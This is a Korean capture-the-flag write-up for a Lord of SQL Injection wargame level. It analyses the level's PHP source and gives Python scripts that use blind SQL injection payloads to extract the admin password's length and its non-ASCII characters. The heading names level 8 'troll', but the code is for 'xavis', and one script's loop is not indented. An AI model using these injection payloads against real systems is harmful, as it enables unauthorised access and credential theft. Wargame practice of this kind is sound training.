## Lord of SQL Injection No. 8 - troll
## 문제 출제 의도
1. Ascii범위를 벗어난 pw 값을 알아낼 수 있는지 확인한다.
2. pw 길이를 알아 낼 수 있는지 확인한다.
3. MYSQL AutoCasting을 이해하는지 확인한다.
## 소스 코드 분석
+ 소스코드
xavis의 소스코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    + 금지 문자열, 문자
        - Get 방식으로 받은 pw값에 'prob _ . ( )중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
        - Get 방식으로 받은 pw값에 'regex','like'중 하나라도 있다면 "HeHe"가 출력되고 문제 풀이에 실패한다.
    + 문제 풀이 조건
        - 문제 풀이에 성공하는 GET방식으로 pw 값과 실제 id='admin'인 레코드의 pw 가 일치하고 그 값이 0이 아닐경우이다.
## 문제 해결
+ 필요 함수
    - ord
        + ord는 문자의 아스키 코드값을 리턴하는 함수이다
        + (※ ord 함수는 chr 함수와 반대이다.)
        ~~~
        >>> ord('a')
        97
        >>> ord('0')
        48
        ~~~
    - hex
        + hex(x)는 정수값을 입력받아 16진수(hexadecimal)로 변환하여 리턴하는 함수이다.
        ~~~
        >>> hex(234)
        '0xea'
        >>> hex(3)
        '0x3'
        ~~~
+ pw 길이
    - 지금까지와는 다르게 pw가 8이 아님으로 pw 길이를 알아내야 한다.
    - 이는 다음과 같은 코드를 작성하면 쉽게 알 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote

    i=1

    while i:
    url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
    data = "' or id='admin' and length(pw)={}-- -".format(i)
    print (data)
    data = quote(data)

    re = urllib.request.Request(url + data)
    re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
    re.add_header("Cookie", "PHPSESSID=vt2ho6kvcu0hjgehmdmuj37qd1")
    res = urllib.request.urlopen(re)

    if  str(res.read()).find("Hello admin") != -1:
            print(i)
            break
    i+=1
    ~~~
    - 이는 결과적으로 40을 출력함으로 pw 의 길이는 40인것을 알 수 있다.

+ pw 값
    - pw길이만 다른 것을 빼면 지금까지와 별 다를 것이 없는 Blind SQL Injection 이라 할 수 있다.
    - 그러나 코드를 작성하여 풀어도 길이만 일치할 뿐 아무 값도 얻어내지 못한다는 사실을 알 수 있다.
    - 따라서 탐색 범위를 확장하여 다음과 같은 코드를 만들어 해결한다
    ~~~
    import urllib.request
    from urllib.parse import quote

    key = ""
    hexcode = "0x"

    for i in range(1,41):
        for j in range(32, 1000):
            url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="#고정된 부분
            data = "' or id='admin' and ord(substr(pw, {}, 1))='{}'#".format(str(i), str(j))
            print(data)
            data = quote(data)

            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
            re.add_header("Cookie", "PHPSESSID=4csf3od9cfat47akhjak8okpi6")

            response = urllib.request.urlopen(re)

            if str(response.read()).find("Hello admin") != -1:
                key += chr(j) #찾은 문자를 추가함
                hexcode += hex(j)[2:] #0x를 잘라주기 위해 문자열을 슬라이스 했다.
                print('key : ' + key)
                print('hex : ' + hexcode)
                break
    print(key)
    ~~~
    - 이는 결과적으로 ¸ùÅ°ÆÐÄ¡¤»을 출력하는데 10자리 이후에서는 아무것도 탐색되지 않는다.
    - 이를 GET 방식으로 입력하면 문제가 해결된다.